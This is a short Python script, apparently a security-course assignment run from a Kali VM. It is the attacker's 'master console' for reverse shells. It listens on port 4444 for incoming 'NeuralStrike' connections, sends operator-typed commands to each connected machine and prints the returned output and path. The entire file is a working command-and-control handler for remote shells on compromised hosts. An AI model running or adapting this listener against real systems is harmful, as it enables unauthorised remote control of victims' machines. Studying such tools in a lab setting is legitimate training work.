import socket
import sys

def start_master_console(port=4444):
    """
    RCA Assignment Attacker Script (Master Console) - v2.1
    Run this on your Kali VM: python3 attacker.py
    """
    print(f"[*] Starting RCA Master Console on port {port}...")
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind(("0.0.0.0", port))
        server.listen(5)
        print("[*] Listening for incoming NeuralStrike connections...")
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)

    while True:
        client, addr = server.accept()
        print(f"\n[+] CONNECTION ESTABLISHED: {addr[0]}")
        
        try:
            buffer = ""
            while True:
                # Accumulate data until the |||SEP||| marker arrives
                while "|||SEP|||" not in buffer:
                    chunk = client.recv(1024).decode(errors='replace')
                    if not chunk: raise ConnectionError("Remote connection closed.")
                    buffer += chunk
                
                # Split the data at the separator
                # parts[0] is the text we see (output + current path)
                # parts[1] is any extra data that came after the separator
                parts = buffer.split("|||SEP|||", 1)
                display_content = parts[0]
                buffer = parts[1] 
                
                # Show prompt and get command
                command = input(display_content)
                
                if command.strip().lower() == "exit":
                    client.send(b"exit")
                    print("[*] Exiting session...")
                    break
                
                if not command.strip():
                    client.send(b" ") # Send space to keep the recv loop moving
                else:
                    client.send(command.encode())
                
                # The loop will now wait for the next output/prompt via the b"|||SEP|||" check
        except Exception as e:
            print(f"\n[-] Session Terminated: {e}")
        finally:
            client.close()
            print("[*] Returning to listening mode...")

if __name__ == "__main__":
    start_master_console()
